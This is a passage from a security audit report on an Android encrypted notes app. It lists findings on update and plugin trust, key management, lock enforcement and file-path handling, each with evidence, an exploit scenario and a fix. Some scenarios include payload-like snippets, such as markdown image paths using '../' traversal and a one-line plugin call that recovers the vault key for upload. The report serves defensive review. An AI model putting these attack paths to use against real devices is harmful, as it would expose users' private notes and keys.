- **Exploit scenario:** On a no-keyguard device (tablet, secondary phone — a natural target for an ink-notes app), the user leaves the app foregrounded and walks away: with auto-lock disabled the notes remain readable indefinitely. Even with a timeout configured, the lock fires only after the next touch, and display-off without a keyguard typically pauses (not stops) the activity, so on resume the same unlocked notes are shown. A shoulder-surfer or casual physical attacker reads decrypted note content with zero interaction. FLAG_SECURE (MainActivity.kt:89-93) is also only applied to non-debug builds.
- **Fix:** Lock on ON_PAUSE or hook `ACTION_SCREEN_OFF`/keyguard state (API 27+ broadcast) in addition to ON_STOP; ship auto-lock enabled by default (e.g., 5 min); apply FLAG_SECURE unconditionally.

### [B1-PLAT-5] PrivacyCrashReporter path-redaction regex targets the wrong package name, so app-private data paths leak into crash logs
- **Severity:** LOW
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `PrivacyCrashReporter.kt:77` (regex `/data/user/\d+/com\.authorss81\.noteflow/\S+`) vs real runtime data dir `/data/user/0/com.aistudio.inkflow.app.bkxjrz/` (applicationId, `app/build.gradle.kts:15`)
- **Exploit scenario:** Because the sanitizer matches the namespace (`com.authorss81.noteflow`) while the device actually uses `com.aistudio.inkflow.app.bkxjrz`, the regex never matches any real path and stack-trace messages can carry full app-private file paths (SQLCipher DB names, vault file layout, imports/exports dirs) into `noteflow_sanitized_crash.log`. Today the log is local-only, but it defeats the stated "zero leak" guarantee of the report and would leak vault layout if any log-viewing/sharing feature is added.
- **Fix:** Build the redaction patterns from `context.packageName` / `context.dataDir.path` at runtime instead of a hardcoded string.

### [B1-PLAT-6] applicationId vs namespace mismatch (`com.aistudio.inkflow.app.bkxjrz` vs `com.authorss81.noteflow`)
- **Severity:** INFO
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `app/build.gradle.kts:11` (namespace, R-class package), `app/build.gradle.kts:15` (applicationId visible to the OS, FileProvider authority becomes `com.aistudio.inkflow.app.bkxjrz.fileprovider`)
- **Exploit scenario:** No direct third-party exploit — the FileProvider authority (from `packageName`) and manifest agree with each other. The risk is drift: any hardcoded `com.authorss81.noteflow` string in code that assumes it equals `packageName` is wrong at runtime (proven live by B1-PLAT-5, and `run-as`/adb tooling, logcat package filters, and any future authority/path literals assume the applicationId). Given FLAG_SECURE + `exported=false` are otherwise correct, this is hygiene.
- **Fix:** Align `namespace` to the applicationId (known Phase 21.10 work) or add a build-time check that greps main-source tree for the stale package string.

### [B1-PLAT-7] UpdateService auto-discovers update APKs in publicly writable directories and offers them as official updates
- **Severity:** MEDIUM
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `UpdateService.kt:104-137` (`checkForDownloadedUpdates` scans `getExternalFilesDir`, `cacheDir`, `filesDir`, `/sdcard/Download`, `/storage/emulated/0/Download`), `UpdateService.kt:146-175` (stages into `filesDir/apk` and drives the platform installer), `UpdateService.kt:195-246` (signature check = compare against current app signatures)
- **Exploit scenario:** An attacker who obtains the release signing key (trivially so under B1-PLAT-1 — the debug keystore) drops a signed, higher-versionCode malicious APK in `/sdcard/Download` via any storage-writable app or a poisoned web download. On the next "check for updates" the app itself announces "New update detected in local storage" and hands the platform installer a same-signature APK, which Android installs as a normal update with NO signature warning — a one-step watering hole for full vault compromise. Even without the key, the mechanism conditions users to believe "updates found in Downloads are legit".
- **Fix:** Never treat public Downloads (or any locally-present APK) as a trusted update source. Only trust updates from an official channel with signature verification against a known/remote-verified signing key, and gate any self-install with a strong "update is not from a trusted source" confirmation.

### [B1-PLAT-8] Master password minimum length of 6; on-device lockout does not protect against offline brute force
- **Severity:** LOW
- **Area:** Batch 1 · Android platform surface
- **Agent:** b1-platform
- **Evidence:** `NoteflowViewModel.kt:1773-1774` (`MIN_PASSWORD_LENGTH = 6`), `1778` (enforced length check); `NoteflowViewModel.kt:1883-1908` (PBKDF2-HMAC-SHA256 600k, 5 attempts then exponential lockout persisted in plain SharedPreferences, `SettingsManager.kt:58-63`)
- **Exploit scenario:** A physical/rooted attacker, or an attacker with adb backup-style access to the app data dir, copies `shared_prefs` (salt + wrapped DEK) and the SQLCipher vault off-device and brute-forces the master password offline with GPUs. A 6-character numeric or short purely-lowercase password collapses in minutes to hours against PBKDF2-600k; the 5-attempt + 30s→15min exponential lockout only throttles on-device attempts and gives false assurance. Restoring the prefs+DB to a rooted emulator defeats lockout entirely.
- **Fix:** Enforce a stronger minimum (≥10 chars) and reject common/sequential/prefix-suffix patterns; document that offline brute force is only mitigated by password entropy, not by the on-device lockout.

### [B1-CRYPTO-01] Downloadable-plugin integrity pins are supplied by an unauthenticated, unpinned HTTP(S) manifest — artifact verification collapses to "trust me"
- **Severity:** CRITICAL
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `PluginUpdateChecker.kt:74-82` (offer.sha256 / offer.pinnedCertHash / offer.downloadUrl all come from the hosted manifest), `PluginUpdateChecker.kt:30-38` (`toTargetEntry` copies those values verbatim into the persisted active entry), `PluginManifestFetcher.kt:69-81` (`HttpsManifestTransport` is explicitly NOT pinned — chain-validation-only HTTPS against the system trust store) + `PluginManifestFetcher.kt:95-135`, `PluginUpdateEngine.kt:108-138` (download pins the TLS session to `target.pinnedCertHash` and verifies against `target.sha256` from the SAME manifest), `SignatureVerifiedPluginRuntime.kt:92-99` (`load` re-verifies every time against `entry.sha256`/`entry.pinnedCertHash`, but those entry fields are already the attacker-supplied ones after an update).
- **Exploit scenario:** The bundled catalog pins are compile-time (safe), but the Phase-24 *update* path replaces them with values taken from a hosted JSON manifest fetched over ordinary TLS with no extra authentication. Any CA in the device trust store can mint a leaf for the manifest host — realistic via a compromised public CA, an enterprise MDM/proxy CA, or DNS + rogue CA. A MITM serves a manifest announcing a "newer" version with `downloadUrl` = attacker host, `sha256` = hash of the malicious APK, `pinnedCertHash` = hash of the attacker's own cert. The user approves the update dialog (shows only version + release notes, no pin/details). `HttpsPluginDownloadTransport.createPinnedConnection` (HttpsPluginDownloadTransport.kt:143-154) happily pins to the attacker's cert, SHA-256 matches, the artifact's signer cert hashes to the "pin" — every check passes by construction — and `DexClassLoader` executes the attacker's code as a plugin with full app privileges. The documented "never from the network" pin guarantee (`PinnedCertHash.kt:20-21`) is silently contradicted by the update path.
- **Fix:** Bind the manifest itself: fetch through a pinned transport using a **compile-time** cert hash (same mechanism as the artifact transport), or sign the manifest body with a compile-time-pinned key and verify before trusting any field. Update offers must never be allowed to re-define `sha256`/`pinnedCertHash` from an unauthenticated source; if the manifest is signed, the signature must commit the artifact pins.

### [B1-CRYPTO-02] Master password is bypassable: a non-user-authenticated AndroidKeyStore copy of the vault DEK persists after the password is set
- **Severity:** HIGH
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `NoteflowDatabase.kt:335-343` the DB factory derives the passphrase from `VaultKeyHolder.dek`, falling back to `security.getOrCreateDek()`; `SecurityService.kt:134-144` `getOrCreateDek` mints a DEK and persists it via `storeDek(dek, authRequired = false)`; `SecurityService.kt:21-50` `getOrCreateKey(false)` creates a GCM AES-256 key with `setUserAuthenticationRequired(false)` (no auth gate, no `setInvalidatedByBiometricEnrollment`); `NoteflowViewModel.kt:1785-1797` `setMasterPassword` re-uses that device-wrapped DEK (`existingDek ?: security.readDek()`) as the vault key but NEVER calls `security.clearDek()`, so the non-auth keystore-wrapped DEK stays in the `noteflow_sec_dek` pref alongside the password-wrapped copy.
- **Exploit scenario:** At first app open (before any password exists) a random DEK is wrapped under the non-auth AndroidKeyStore key and stored in plaintext SharedPreferences. Setting a master password only adds a second wrapping (PBKDF2(PW,salt)) of the SAME DEK — the unauthenticated copy is left in place. An attacker with device access (rooted/forforensically-acquired device, or an app-process code-injection point such as the CRYPTO-01 plugin RCE) invokes the AndroidKeyStore key under the app UID — no credential, no biometric, no lockout — recovers the DEK, and decrypts `noteflow.sqlite` plus all field ciphertext completely. The advertised "AES-256-GCM local encryption … 5-fail lockout" protection (`HomeScreen.kt:1455`) is theater in this access class: the vault can be unlocked without any password.
- **Fix:** In `setMasterPassword` (and on every password unlock) call `SecurityService.clearDek()` so the only at-rest wrapping of the DEK is under the password-derived KEK in settings. Re-persist the device copy ONLY when the user explicitly enables biometrics, and then with `authRequired = true` (biometric-gated key).

### [B1-CRYPTO-03] Salt and wrapped-DEK are written in two non-atomic `.apply()` steps; a process kill between them permanently bricks the vault
- **Severity:** MEDIUM
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `NoteflowViewModel.kt:1794-1795` (`settings.masterPasswordSalt = …` then `settings.masterPasswordWrappedDek = …` as two independent SharedPreferences writes), `NoteflowViewModel.kt:1829-1830` (same pattern in `changeMasterPassword`), with the SQLCipher DB already created/re-keyed under the new DEK before these prefs are committed.
- **Exploit scenario:** The app is killed (low-memory killer, crash, battery pull) exactly between the two pref writes during `setMasterPassword`/`changeMasterPassword`. The on-disk state is then e.g. new salt + old/missing wrapped DEK; every subsequent `verifyMasterPassword`/`isMasterPasswordValid` hits an AEADBadTag/IllegalArgumentException permanently (storeDek/blob never match the salt). Unlock becomes impossible forever, the phase-09 H2 handler quarantines the DB as `*.corrupt-*`, and the user loses the entire vault from a single unlucky kill. No checksum exists at the settings level to detect the half-written pair.
- **Fix:** Store salt + wrappedDEK (+ format) as ONE versioned blob in a single `commit()` (disk-sync-acknowledged), or write the new pair to a scratch key and atomically swap; validate round-trip (decrypt the wrapped DEK) before reporting success.

### [B1-CRYPTO-04] Weak-password policy + process-local-only lockout ⇒ offline brute-force of the wrapped DEK on a copied vault
- **Severity:** MEDIUM
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `NoteflowViewModel.kt:1773` `MIN_PASSWORD_LENGTH = 6` and no complexity/entropy check; `EncryptionService.kt:31-35` (only protection is 600k-iteration PBKDF2-HMAC-SHA256); `NoteflowViewModel.kt:1875-1913` lockout counters are process memory + benign prefs, trivially reset (`isMasterPasswordValid` at `NoteflowViewModel.kt:1920-1937` has NO attempt accounting at all).
- **Exploit scenario:** The salt + wrapped-DEK (`settings.masterPasswordSalt`/`masterPasswordWrappedDek`) and the SQLCipher `noteflow.sqlite` sit on the normal data partition. An attacker who obtains a data copy (cloud/manual backup, forensic extraction, shared device image) cracks the wrapped DEK offline with a GPU/FPGA PBKDF2-SHA-256 rig; a 6-7 character lowercase/numeric password falls in hours-to-days. The on-device 5-fail lockout never fires because no attempt happens through the UI. `isMasterPasswordValid` is additionally an attractive in-app oracle since it never increments failure counters.
- **Fix:** Enforce a stronger minimum (length + diversity or an entropy check) at `setMasterPassword`/`changeMasterPassword`; note the lockout is UI-only and document that vault contents are only as strong as the password; consider TEE-bound attempt gating or an Argon2id KDF. (Pairs with B1-CRYPTO-02: removing the non-auth DEK copy removes the trivial bypass that makes password strength mostly moot today.)

### [B1-CRYPTO-05] `getOrCreateDek` silently mints a brand-new DEK when the stored one becomes undecryptable → silent re-key destroys access to existing data
- **Severity:** MEDIUM
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `SecurityService.kt:134-144` (`readDek` returns null on ANY failure path incl. keystore key loss → `EncryptionService.generateDek()` → `storeDek` OVERWRITES the pref); `SecurityService.kt:104-106` `storeDek` swallows every exception with no signal to the caller; `NoteflowDatabase.kt:335-343` the factory then uses the brand-new DEK as the SQLCipher passphrase.
- **Exploit scenario:** AndroidKeyStore aliases do not survive app-data restores, ROM migrations, or keystore resets on some OEMs/APIs. If prefs survive but the keystore key does not (or the blob is corrupted / one-time keystore malfunction), `readDek()` → null, `getOrCreateDek()` mints a fresh DEK and persists it. The next DB open tries the new passphrase against the still-encrypted vault → the phase-09 H2 handler quarantines the real vault as `*.corrupt-*` and the user is told the vault is corrupt; the genuinely-survivable data is permanently unrecoverable, and there is no diagnostic distinguishing "key lost" from "data corrupt". Fail-safe, but silently destructive.
- **Fix:** Distinguish "no blob stored" from "blob present but not decryptable" (e.g. return a sealed result / throw a typed `KeystoreKeyLostException`); on key loss go to the explicit recovery screen (with the restore-from-backup path) instead of silently minting a new key; persist a non-secret marker of which keystore alias/version wrapped the current blob.

### [B1-CRYPTO-06] `DatabaseSecurityHelper` tamper check fails OPEN (missing/undecryptable checksum ⇒ trust and re-baseline)
- **Severity:** LOW
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `DatabaseSecurityHelper.kt:146-154` `verifyDatabaseIntegrity`: stored==null → `updateStoredChecksum(context); return true` (silently re-baselines whatever is on disk); `computeDatabaseHmac` returns null on any error → `?: return true` (line 152); checksum + state live in the same unencrypted pref file the attacker can edit.
- **Exploit scenario:** The HMAC key is honestly non-exportable (good), so a forger cannot recompute a checksum — but an attacker who can only delete the `db_hmac_checksum` pref (root, or prefs tampering) gets the app to re-baseline against the current (possibly tampered/forged-in-DB-layer) file and reports "verified". Combined with an in-memory Frida hook to rewrite content post-decryption this removes the last tripwire. Impact limited because SQLCipher content can't be made to decrypt without the DEK, but the tamper-evidence feature is unreliable by construction and would not alert on the B1-CRYPTO-05 silent re-key, either.
- **Fix:** Fail CLOSED: a missing or un-computable checksum should report "cannot verify / possibly tampered" to the recovery UI rather than re-arm the baseline. Keep the checksum pref write-only through the helper and never re-baseline from a file that arrives un-trusted.

### [B1-CRYPTO-07] Biometric DEK key is only biometric-gated on API 30+; below that it is satisfiable by any device credential
- **Severity:** MEDIUM
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `SecurityService.kt:38-45` — `setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)` is applied ONLY when `Build.VERSION.SDK_INT >= R`; on API 26-29 the key is created with bare `.setUserAuthenticationRequired(true)` (no authenticator-type bound), so a PIN/pattern/password satisfies it; `BiometricAuthHelper.kt:11-17` only checks *availability* of a strong biometric at prompt time, not what the KEY requires; `SecurityService.kt:58-66` (`getDecryptionCipher`) creates the `_auth` key on demand if the alias is absent.
- **Exploit scenario:** On an API 26-29 device with biometrics enabled, the DEK-wrapped blob is protected by a key that a screen-PIN (4-6 digits, unlimited attempts at the keystore level for non-rate-limited unlock) can authorize: `cipher.init(DECRYPT_MODE, key)` only requires "authenticated since enrollment", which the device credential satisfies on these API levels. An attacker with the device uses the lock-screen PIN to authorize the unwrap and recovers the DEK — the UI claims biometric-only protection. On API 30+ the spec is correct, so this is a version-dependent downgrade.
- **Fix:** Store an explicit marker of the API level at key creation; refuse to enable biometric lock (or fall back to a clear warning + password-only) when the platform cannot create a biometric-STRONG-bound key; use `AUTH_BIOMETRIC_STRONG` in `setUserAuthenticationParameters` unconditionally once a minimum-SDK bump is feasible.

### [B1-CRYPTO-08] Artifact signer pin binds only ONE entry's cert (last-signed-entry-wins) instead of the full signer set — no chain/expiry/key-usage validation
- **Severity:** MEDIUM
- **Area:** Batch 1 · Cryptography & key management
- **Agent:** b1-crypto
- **Evidence:** `ArtifactSignatureVerifier.kt:89-105` `findSignerCertificate`: iterates entries in JarFile order and takes `certs.firstOrNull()` of the LAST non-META-INF entry that happens to carry certificates (`signer = certs.firstOrNull()`); entries outside the manifest `Name:` sections return `certificates == null` and are skipped; `ArtifactSignatureVerifier.kt:100-102` — no assertion that every loaded entry is signed by the pinned cert, no chain build, no `checkValidity()`, no key-usage check.
- **Exploit scenario:** The pin check only proves "at least one entry in the archive was signed by the pinned certificate". A JAR with two signers — the genuine pinned cert on one benign entry, an attacker key on `classes.dex` and friends — would pass if iteration happens to end on the genuine-signed entry. Today this is neutralized by the whole-file SHA-256 pin (any extra/different byte breaks the hash), but the moment anything perturbs the SHA-256 trust (see B1-CRYPTO-01, where sha256 is attacker-supplied, or a genuine-but-stale catalog entry) the signature gate becomes a real bypass. It is also the only check deciding which cert to compare, so an expired/revoked pinned cert is silently accepted.
- **Fix:** Require the FULL signer certificate set of every non-META-INF entry to be exactly the one pinned cert (reject any multi-signer or unsigned entry in verified jars); validate cert validity period and key usage for signature; fail hard if the verified signer set is empty rather than falling back to the last entry seen.

### [B1-AUTH-01] Downloadable plugin bytecode executes with the app classloader as parent — the capability facade is a convention, not an isolation boundary; DEK/DB/keystore are directly reachable in-process
- **Severity:** HIGH
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `AppClassLoaderFactory.kt:22-28` (`DexClassLoader(artifactPath, optimizedDir, null, parent)` — the parent is the app's own classloader); `RuntimePluginLoader.kt:94-121` (loads the declared class through that loader and never restricts resolution); `PluginContext.kt:27-29` documents "the plugin NEVER receives ... DB, keystore, EncryptionService handles" — but that is a documentation convention; nothing in the loader, registry or manager prevents plugin code from importing `com.authorss81.noteflow.services.VaultKeyHolder`, `NoteflowDatabase`, `SecurityService`, `SettingsManager`, etc. `NoteflowPlugin.kt`/`PluginManager.withPluginAsync` (PluginManager.kt:117-126) then invoke that bytecode with full app privileges on `Dispatchers.Default`.
- **Exploit scenario:** A compromise at any point in the artifact trust chain (the B1-CRYPTO-01 unauthenticated update manifest, a stolen/leaked signing key, a poisoned build of an otherwise-trusted plugin) delivers plugin bytecode that, on its first legitimately-routed invocation, simply executes `val dek = VaultKeyHolder.dek ?: SecurityService(context).getOrCreateDek()` and uploads it (granted `httpGet` via the WebSearch/Assistant whitelist, or a raw `HttpURLConnection` the plugin is free to open). The whitelist/GRANT-DENY facade (`FacadeWhitelist`, `CapabilityAwarePluginContext`) is a UX policy layer: it only limits calls through the optional `PluginContext`, and a plugin is under no obligation to use it. There is no security boundary between a plugin and the vault.
- **Fix:** Load plugin DEX under an isolated classloader whose *parent* is a scoped, interface-only loader (so `com.authorss81.noteflow.*` beyond the `plugins.*`/`plugin-sdk` framework types cannot be resolved), or run downloadable plugins in a separate/`:remote` process behind an IPC capability boundary; at install/verify time statically scan the artifact for references to `services.*`, `data.*`, `VaultKeyHolder`, `EncryptionService` and reject; enforce network egress only through the host.

### [B1-AUTH-02] Locking zeroizes `VaultKeyHolder` but leaves the keyed SQLCipher connection open, and the DB factory silently re-derives the DEK from prefs while the vault is locked — the lock is not enforced at the data layer
- **Severity:** HIGH
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `NoteflowViewModel.kt:2055-2067` `lock()` calls `repository.zeroizeKey()` only — no `NoteflowDatabase.dispose()`; `NoteflowDatabase.kt:351-366` the Room INSTANCE stays alive; `NoteflowDatabase.kt:335-343` `NoteflowSqlcipherFactory.create` does `var dek = VaultKeyHolder.dek; if (dek == null) { dek = SecurityService(context).getOrCreateDek(); VaultKeyHolder.dek = dek }` — i.e. ANY DB open while locked re-materializes the DEK from SharedPreferences/keystore (the non-auth device copy, see B1-CRYPTO-02) with no credential and no lock check.
- **Exploit scenario:** After a lock, any in-process code path that reaches `repository` or `db` — a stale coroutine, an enabled plugin's hook (B1-AUTH-03), the loader path of B1-AUTH-01 — either (a) keeps using the still-keyed SQLCipher connection, returning plaintext for all non-field-encrypted columns (notebook/section names, tags, `sourceFilePath`, stroke color/width/coordinates/timestamps, media-embed URLs/positions, palette items), or (b) triggers a fresh open which re-fetches the persisted device-wrapped DEK and even exposes field ciphertext. The "Lock Screen" is only a Compose-level `if (authenticated)` boolean — nothing at the repository/database layer verifies the lock, so the "zeroized on lock" guarantee is false for every connection and every auto-reopen.
- **Fix:** `lock()` must also `NoteflowDatabase.dispose()` (close/forget the SQLCipher connection so no keyed handle survives) and re-open only after a successful explicit unlock; `NoteflowSqlcipherFactory.create` must fail closed when `VaultKeyHolder.dek == null` instead of calling `getOrCreateDek()` (no key → throw/route to a recovery screen, never silently mint or restore a key on a locked vault).

### [B1-AUTH-03] Downloadable-plugin lifecycle hooks (`onProcessStart` → `onEnable`) execute on every cold start while the vault is still locked
- **Severity:** MEDIUM
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `NoteflowViewModel.kt:211-227` the init block runs `pluginEntryStore.all().forEach { … pluginRuntime.load(entry) … pluginRegistry.registerRemotePlugin(loaded.value.plugin, appContext) }` and then `pluginRegistry.onProcessStart(appContext)` unconditionally — before the user has authenticated; `PluginRegistry.kt:172-191` `onProcessStart` fires `guardedOnEnable(plugin, context)` for every enabled plugin with the real application `Context`.
- **Exploit scenario:** An installed + enabled downloadable plugin's `onEnable(context)` runs at every process launch while the app is sitting on the LockScreen. The hook receives a live `Context` and (per B1-AUTH-01) full class access; combined with B1-AUTH-02 it can open the database and recover the DEK before the user ever unlocks. Even a benign plugin that thinks it is "starting" gets to run privileged code in a security state (locked) the UI otherwise forbids — hard to audit, easy to abuse.
- **Fix:** Gate all plugin runtime loading and lifecycle hooks (including store re-materialization) behind `authenticated == true`; do not run any plugin code before a successful unlock, and stop/disable hooks on lock.

### [B1-AUTH-04] Markdown image references resolve arbitrary absolute and `..`-traversing paths (local file disclosure + existence oracle)
- **Severity:** MEDIUM
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `ImageViewer.kt:123-132` `MarkdownInlineImage` resolves `destination` as `File(dest)` and accepts it if `file.isAbsolute && file.exists()`, or `File(baseDir, dest)` with no canonicalization (a `../../..` destination escapes `baseDir`); `MarkdownPreviewScreen.kt:1249-1264` feeds every `![alt](dest)` from the note into it; `baseDir` is the note file's parent (`MarkdownPreviewScreen.kt:534`).
- **Exploit scenario:** A crafted note arriving via Obsidian/HTML vault-import zip, WebDAV sync, the share sheet, or LocalSend contains `![x](/data/user/0/<appId>/files/voice_notes/… )` or `![x](../../../<something readable>)`. When the user opens the note, the app `decodeBoundedImage`-reads any file the process can read, including the vault's own plaintext imports, shared/ staging, exports and voice notes, and displays it; the "File not found: <path>" fallback (`ImageViewer.kt:163-170`) doubles as an existence oracle. On a shared/kiosk device this is an in-app arbitrary file reader.
- **Fix:** Resolve image destinations only inside an allowlisted app-private subtree via `file.canonicalPath.startsWith(rootDir.canonicalPath)`; reject absolute paths and any path segment `..`.

### [B1-AUTH-05] `note.sourceFilePath` is stored unencrypted and never validated — a crafted vault backup can point it at arbitrary files (read/write primitive inside the app sandbox)
- **Severity:** MEDIUM
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `MainActivity.kt:311-341` (for every `.md`/`.txt` note the app does `File(page.sourceFilePath).readText()` and `File(path).writeText(newText)`), `WikiLinkParser.kt:64-73` (`getFullTextForPage` reads `File(path).readText()`), `HomeScreen.kt:217,227-236` (imports set `sourceFilePath` to the imports path), and `ImportExportService.kt:1414-1429` (`restoreFromZip` validates zip entry *names* but never re-validates `pages.sourceFilePath` column values loaded from the restored DB); only `deletePagePermanently` bounds the path (`NoteRepository.kt:424-428`, substring check `imports/`|`exports/`).
- **Exploit scenario:** Restoring a malicious vault backup transplants a DB whose `pages.sourceFilePath` rows point anywhere the app can access (e.g. `/data/user/0/<appId>/files/shared/…`, the crash-log file, another note's file). Opening the note surfaces that file's full contents in the editor/preview (disclosure), and saving writes attacker-controlled bytes to an attacker-chosen path the app can write. Same primitive re-usable by any plugin via the repository.
- **Fix:** Canonicalize `sourceFilePath` at restore/import time and confine it under the imports root (reject non-matching absolute paths and any `..`); enforce the same confinement in `updatePageSource` and on every read/write in MainActivity/WikiLinkParser.

### [B1-AUTH-06] `.md`/`.txt` note bodies and imported text files are stored in cleartext on disk while only the DB columns are encrypted
- **Severity:** MEDIUM
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `ImportExportService.kt:55-75` (`persistFile` writes plaintext to `filesDir/noteflow/imports`); `MainActivity.kt:333-341` (`File(path).writeText(newText)` persists markdown plaintext on every save — the file is the authoritative content since the preview reads it back at `MainActivity.kt:311-319`); `HomeScreen.kt:217,227-235` (docx → md and md/txt imports write plaintext files); `WikiLinkParser.kt:64-73` reads them.
- **Exploit scenario:** Regardless of master-password strength, the full content of any text/markdown note exists verbatim as a plaintext file on `/data`. A rooted/forensically-equipped attacker, a backup restore of the data partition, or any sandbox escape recovers the entire note corpus without the DEK, field decryption, or the password — undercutting the "encrypted vault" posture. Markdown content is also duplicated in the (encrypted) `extractedText` column, so the plaintext copy is pure downside.
- **Fix:** Do not persist note text as plaintext files: store content only in the encrypted DB fields (materialize temp files transiently if needed and delete on close), or encrypt the source files with the DEK and decrypt on read.

### [B1-AUTH-07] `isMasterPasswordValid` is an unrestrained master-password oracle that bypasses the 5-attempt exponential lockout
- **Severity:** LOW
- **Area:** Batch 1 · App logic & auth
- **Agent:** b1-applogic
- **Evidence:** `NoteflowViewModel.kt:1920-1937` — the side-effect-free verifier ignores `lockoutActive()` and never bumps `failedUnlockAttempts`/`lockoutUntilEpochMs`; its only caller is the backup dialog's password field (`HomeScreen.kt:1183`, wired into the create-backup button at `HomeScreen.kt:1166-1211`) which accepts unlimited submits with no delay; contrast `verifyMasterPassword` (`NoteflowViewModel.kt:1875-1913`) which enforces the persisted lockout.
- **Exploit scenario:** On an unlocked device (the app's normal state — auto-lock only trips on ON_STOP/backgrounding), an attacker with a brief window of access can hammer the "Create password-protected backup" dialog with password guesses: each attempt runs full PBKDF2 and returns a clean pass/fail with zero throttling, giving an in-app offline-equivalent oracle that never trips the lockout the LockScreen relies on. The recovered password then unlocks any *copy* of the vault artifacts (B1-CRYPTO-04) and permits a future master-password change. Also, the `changeMasterPassword`/`setBiometricEnabled` paths re-wrap the DEK under the non-auth keystore key when biometrics are off (re-instantiation of the B1-CRYPTO-02 bypass).
- **Fix:** Route `isMasterPasswordValid` through the same counters/lockout as `verifyMasterPassword` (or reject it entirely and reuse the throttled verifier at a single call site); require in-app re-authentication immediately before a password-protected export.

-->
